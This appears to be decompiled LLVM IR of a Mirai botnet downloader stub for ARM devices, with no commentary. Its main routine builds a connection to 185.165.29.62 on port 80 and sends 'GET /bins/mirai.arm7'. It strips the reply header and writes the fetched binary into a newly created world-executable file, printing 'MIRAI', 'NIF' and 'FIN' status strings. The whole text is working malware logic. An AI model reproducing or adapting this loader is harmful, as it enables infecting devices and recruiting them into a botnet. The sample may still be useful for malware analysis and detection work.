source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r3 = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@global_var_817c.1 = local_unnamed_addr global i32 283
@global_var_8204.2 = local_unnamed_addr global i32 281
@global_var_8421.3 = constant [4 x i8] c"rm7\00"
@global_var_8428.4 = constant [7 x i8] c"MIRAI\0A\00"
@global_var_8388.5 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8421.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8428.4, i32 0, i32 0)]
@global_var_838c.6 = local_unnamed_addr global [7 x i8]* @global_var_8428.4
@global_var_8390.7 = local_unnamed_addr global i32 577
@global_var_8394.8 = local_unnamed_addr global i32 511
@global_var_8430.9 = constant [9 x i8] c"Wordmemy\00"
@global_var_843c.10 = constant [5 x i8] c"NIF\0A\00"
@global_var_8444.11 = constant [34 x i8] c"GET /bins/mirai.arm7 HTTP/1.0\0D\0A\0D\0A\00"
@global_var_8398.12 = local_unnamed_addr global [3 x i8*] [i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8430.9, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_843c.10, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_8444.11, i32 0, i32 0)]
@global_var_82a0.13 = global i32 -509607931
@global_var_80e4.14 = global i32 -449978364
@global_var_839c.15 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_843c.10, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_8444.11, i32 0, i32 0)]
@global_var_83a0.16 = local_unnamed_addr global [34 x i8]* @global_var_8444.11
@global_var_82f0.17 = global i32 -442531668
@global_var_83a4.18 = local_unnamed_addr global i32 218762506
@global_var_8318.19 = global i32 -438488937
@global_var_8468.20 = constant [5 x i8] c"FIN\0A\00"
@global_var_83a8.21 = local_unnamed_addr global [5 x i8]* @global_var_8468.20
@global_var_8088.22 = global i32 8
@global_var_8408.23 = local_unnamed_addr global i32* @global_var_8088.22

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_80c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v4_80c0 = mul i32 %arg2, 65536
  %v4_80c4 = mul i32 %arg1, 16777216
  %v4_80c8 = mul i32 %arg3, 256
  %v5_80c0 = or i32 %v4_80c0, %v4_80c4
  %v5_80c4 = or i32 %v5_80c0, %arg4
  %v5_80c8 = or i32 %v5_80c4, %v4_80c8
  %v3_80cc = mul i32 %arg4, 16777216
  %v4_80d0 = mul i32 %arg3, 65536
  %v5_80d0 = or i32 %v3_80cc, %v4_80d0
  %v1_80d4 = and i32 %v5_80c8, 16711680
  %v4_80d8 = udiv i32 %v1_80d4, 256
  %v4_80dc = udiv i32 %v5_80c8, 16777216
  %v5_80d8 = or i32 %v5_80d0, %v4_80dc
  %v5_80dc = or i32 %v5_80d8, %v4_80d8
  ret i32 %v5_80dc

; uselistorder directives
  uselistorder i32 16777216, { 2, 0, 1 }
}

define i32 @function_80e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_80e4:
  %v2_80f4 = call i32 @function_83b0(i32 1, i32 %arg1)
  ret i32 %v2_80f4
}

define i32 @function_8104(i32 %arg1) local_unnamed_addr {
dec_label_pc_8104:
  %v2_8114 = call i32 @function_83b0(i32 6, i32 %arg1)
  ret i32 %v2_8114
}

define i32 @function_8124(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8124:
  store i32 %arg3, i32* @r3, align 4
  %v2_8140 = call i32 @function_83b0(i32 5, i32 %arg1)
  ret i32 %v2_8140
}

define i32 @function_8150(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8150:
  store i32 %arg3, i32* @r3, align 4
  %v0_8168 = load i32, i32* @global_var_817c.1, align 4
  %v2_816c = call i32 @function_83b0(i32 %v0_8168, i32 %arg1)
  ret i32 %v2_816c
}

define i32 @function_8180(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8180:
  store i32 %arg3, i32* @r3, align 4
  %v2_819c = call i32 @function_83b0(i32 4, i32 %arg1)
  ret i32 %v2_819c
}

define i32 @function_81ac(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_81ac:
  store i32 %arg3, i32* @r3, align 4
  %v2_81c8 = call i32 @function_83b0(i32 3, i32 %arg1)
  ret i32 %v2_81c8
}

define i32 @function_81d8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_81d8:
  store i32 %arg3, i32* @r3, align 4
  %v0_81f0 = load i32, i32* @global_var_8204.2, align 4
  %v2_81f4 = call i32 @function_83b0(i32 %v0_81f0, i32 %arg1)
  ret i32 %v2_81f4

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_83b0, { 2, 5, 4, 0, 1, 6, 3 }
}

define i32 @function_8208() local_unnamed_addr {
dec_label_pc_8208:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-25 = alloca i8, align 1
  %stack_var_-44 = alloca i32, align 4
  %v0_820c = load i32, i32* bitcast ([2 x i8*]* @global_var_8388.5 to i32*), align 8
  store i32 0, i32* %r8.global-to-local, align 4
  %v1_82208 = add i32 %v0_820c, -1
  %v2_82209 = inttoptr i32 %v1_82208 to i8*
  %v3_822010 = load i8, i8* %v2_82209, align 1
  %v4_822011 = zext i8 %v3_822010 to i32
  store i32 %v4_822011, i32* %r6.global-to-local, align 4
  %v2_822412 = icmp eq i8 %v3_822010, 0
  br i1 %v2_822412, label %dec_label_pc_8230, label %dec_label_pc_821c

dec_label_pc_821c:                                ; preds = %dec_label_pc_8208, %dec_label_pc_821c
  %v0_8228.in = phi i32 [ %v0_8228, %dec_label_pc_821c ], [ %v0_820c, %dec_label_pc_8208 ]
  %v0_821c = phi i32 [ %v1_821c, %dec_label_pc_821c ], [ 0, %dec_label_pc_8208 ]
  %v0_8228 = add i32 %v0_8228.in, 1
  %v1_821c = add i32 %v0_821c, 1
  store i32 %v1_821c, i32* %r8.global-to-local, align 4
  %v2_8220 = inttoptr i32 %v0_8228.in to i8*
  %v3_8220 = load i8, i8* %v2_8220, align 1
  %v4_8220 = zext i8 %v3_8220 to i32
  store i32 %v4_8220, i32* %r6.global-to-local, align 4
  %v2_8224 = icmp eq i8 %v3_8220, 0
  br i1 %v2_8224, label %dec_label_pc_8230, label %dec_label_pc_821c

dec_label_pc_8230:                                ; preds = %dec_label_pc_821c, %dec_label_pc_8208
  %v0_8230 = load i32, i32* bitcast ([7 x i8]** @global_var_838c.6 to i32*), align 4
  %v4_823c = call i32 @function_8180(i32 1, i32 %v0_8230, i32 6)
  store i32 2, i32* %stack_var_-44, align 4
  %v7_8260 = call i32 @function_80c0(i32 185, i32 165, i32 29, i32 62, i32 2, i32 20480)
  %v0_8264 = load i32, i32* @global_var_8390.7, align 16
  %v0_826c = load i32, i32* @global_var_8394.8, align 4
  %v0_8270 = load i32, i32* bitcast ([3 x i8*]* @global_var_8398.12 to i32*), align 8
  %v4_8274 = call i32 @function_8124(i32 %v0_8270, i32 %v0_8264, i32 %v0_826c)
  store i32 %v4_8274, i32* %r7.global-to-local, align 4
  %v0_8280 = load i32, i32* %r6.global-to-local, align 4
  %v3_8288 = call i32 @function_81d8(i32 2, i32 1, i32 %v0_8280)
  %v7_828c = icmp eq i32 %v3_8288, -1
  %v8_8290 = icmp eq i32 %v4_8274, -1
  %v0_829c = or i1 %v7_828c, %v8_8290
  store i32 %v3_8288, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_82a0.13 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v0_829c, i32 ptrtoint (i32* @global_var_80e4.14 to i32))
  %v2_82a4 = ptrtoint i32* %stack_var_-44 to i32
  %v3_82ac = call i32 @function_8150(i32 %v3_8288, i32 %v2_82a4, i32 16)
  store i32 %v3_82ac, i32* %r4.global-to-local, align 4
  %v1_82b0 = icmp slt i32 %v3_82ac, 0
  br i1 %v1_82b0, label %dec_label_pc_82b8, label %dec_label_pc_82d0

dec_label_pc_82b8:                                ; preds = %dec_label_pc_8230
  %v0_82bc = load i32, i32* bitcast ([2 x i8*]* @global_var_839c.15 to i32*), align 4
  %v4_82c4 = call i32 @function_8180(i32 1, i32 %v0_82bc, i32 4)
  %v0_82c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_82c8 = sub i32 0, %v0_82c8
  %v1_82cc = call i32 @function_80e4(i32 %v1_82c8)
  br label %dec_label_pc_82d0

dec_label_pc_82d0:                                ; preds = %dec_label_pc_8230, %dec_label_pc_82b8
  %v0_82d0 = load i32, i32* %r8.global-to-local, align 4
  %v1_82d0 = add i32 %v0_82d0, 29
  store i32 %v1_82d0, i32* %r4.global-to-local, align 4
  %v0_82d4 = load i32, i32* %r5.global-to-local, align 4
  %v0_82d8 = load i32, i32* bitcast ([34 x i8]** @global_var_83a0.16 to i32*), align 32
  %v4_82e0 = call i32 @function_8180(i32 %v0_82d4, i32 %v0_82d8, i32 %v1_82d0)
  store i32 ptrtoint (i32* @global_var_82f0.17 to i32), i32* @lr, align 4
  %v1_82ec = icmp ne i32 %v4_82e0, %v1_82d0
  call void @__pseudo_cond_branch(i1 %v1_82ec, i32 ptrtoint (i32* @global_var_80e4.14 to i32))
  %v0_82f0 = load i32, i32* @global_var_83a4.18, align 4
  store i32 %v0_82f0, i32* %r8.global-to-local, align 4
  %v0_82f4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_82f4, i32* %r4.global-to-local, align 4
  %v2_82f8 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v2_82f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %dec_label_pc_82fc, %dec_label_pc_82d0
  %v0_8304 = load i32, i32* %r5.global-to-local, align 4
  %v3_8308 = call i32 @function_81ac(i32 %v0_8304, i32 %v2_82f8, i32 1)
  store i32 ptrtoint (i32* @global_var_8318.19 to i32), i32* @lr, align 4
  %v1_8314 = icmp ne i32 %v3_8308, 1
  call void @__pseudo_cond_branch(i1 %v1_8314, i32 ptrtoint (i32* @global_var_80e4.14 to i32))
  %v3_8318 = load i8, i8* %stack_var_-25, align 1
  %v4_8318 = sext i8 %v3_8318 to i32
  %v1_831c = load i32, i32* %r4.global-to-local, align 4
  %v4_831c = mul i32 %v1_831c, 256
  %v5_831c = or i32 %v4_831c, %v4_8318
  store i32 %v5_831c, i32* %r4.global-to-local, align 4
  %v1_8320 = load i32, i32* %r8.global-to-local, align 4
  %v9_8320 = icmp eq i32 %v5_831c, %v1_8320
  br i1 %v9_8320, label %dec_label_pc_8328, label %dec_label_pc_82fc

dec_label_pc_8328:                                ; preds = %dec_label_pc_82fc
  %v2_8328 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %v2_8328, i32* %r4.global-to-local, align 4
  %v0_83342 = load i32, i32* %r5.global-to-local, align 4
  %v3_83383 = call i32 @function_81ac(i32 %v0_83342, i32 %v2_8328, i32 128)
  %tmp31 = icmp slt i32 %v3_83383, 1
  br i1 %tmp31, label %dec_label_pc_8354, label %dec_label_pc_834c

dec_label_pc_834c:                                ; preds = %dec_label_pc_8328, %dec_label_pc_834c
  %v3_83386 = phi i32 [ %v3_8338, %dec_label_pc_834c ], [ %v3_83383, %dec_label_pc_8328 ]
  %v0_8344 = load i32, i32* %r7.global-to-local, align 4
  %v3_834c = call i32 @function_8180(i32 %v0_8344, i32 %v2_8328, i32 %v3_83386)
  %v0_8334 = load i32, i32* %r5.global-to-local, align 4
  %v3_8338 = call i32 @function_81ac(i32 %v0_8334, i32 %v2_8328, i32 128)
  %tmp32 = icmp slt i32 %v3_8338, 1
  br i1 %tmp32, label %dec_label_pc_8354, label %dec_label_pc_834c

dec_label_pc_8354:                                ; preds = %dec_label_pc_834c, %dec_label_pc_8328
  %v0_8354 = load i32, i32* %r5.global-to-local, align 4
  %v1_8358 = call i32 @function_8104(i32 %v0_8354)
  %v0_835c = load i32, i32* %r7.global-to-local, align 4
  %v1_8360 = call i32 @function_8104(i32 %v0_835c)
  %v0_8364 = load i32, i32* bitcast ([5 x i8]** @global_var_83a8.21 to i32*), align 8
  %v4_8370 = call i32 @function_8180(i32 1, i32 %v0_8364, i32 4)
  %v1_8378 = call i32 @function_80e4(i32 5)
  ret i32 %v1_8378

; uselistorder directives
  uselistorder i32 %v3_8338, { 1, 0 }
  uselistorder i32 %v2_8328, { 2, 1, 0, 3 }
  uselistorder i32 %v3_8288, { 0, 2, 1 }
  uselistorder i32 %v1_821c, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i8* %stack_var_-25, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 4, 2, 3, 5 }
  uselistorder i32 (i32)* @function_8104, { 1, 0 }
  uselistorder i32 128, { 1, 0 }
  uselistorder i32 256, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_81ac, { 2, 0, 1 }
  uselistorder i32 (i32)* @function_80e4, { 1, 0 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 2, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8180, { 4, 3, 2, 1, 0 }
  uselistorder i8 0, { 1, 0 }
  uselistorder i32 1, { 11, 8, 7, 6, 12, 9, 10, 13, 18, 0, 17, 15, 16, 4, 3, 5, 2, 1, 14 }
  uselistorder label %dec_label_pc_834c, { 1, 0 }
  uselistorder label %dec_label_pc_82d0, { 1, 0 }
  uselistorder label %dec_label_pc_821c, { 1, 0 }
}

define i32 @entry_point() local_unnamed_addr {
entry:
  %v0_83ac = call i32 @function_8208()
  ret i32 %v0_83ac
}

define i32 @function_83b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_83b0:
  %v2_83d4 = icmp ugt i32 %arg2, -4097
  br i1 %v2_83d4, label %dec_label_pc_83e0, label %bb

bb:                                               ; preds = %dec_label_pc_83b0
  ret i32 %arg2

dec_label_pc_83e0:                                ; preds = %dec_label_pc_83b0
  %v0_83e4 = load i32, i32* bitcast (i32** @global_var_8408.23 to i32*), align 8
  %v1_83ec = add i32 %v0_83e4, 33780
  %v2_83ec = inttoptr i32 %v1_83ec to i32*
  %v3_83ec = load i32, i32* %v2_83ec, align 4
  %v0_83f0 = call i32 @function_8410()
  %v1_83f4 = sub i32 0, %arg2
  store i32 %v1_83f4, i32* @r3, align 4
  %v3_83f8 = add i32 %v3_83ec, %v0_83f0
  %v4_83f8 = inttoptr i32 %v3_83f8 to i32*
  store i32 %v1_83f4, i32* %v4_83f8, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32* @r3, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 0, { 12, 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 16 }
  uselistorder i32 %arg2, { 0, 2, 1 }
}

define i32 @function_8410() local_unnamed_addr {
dec_label_pc_8410:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr
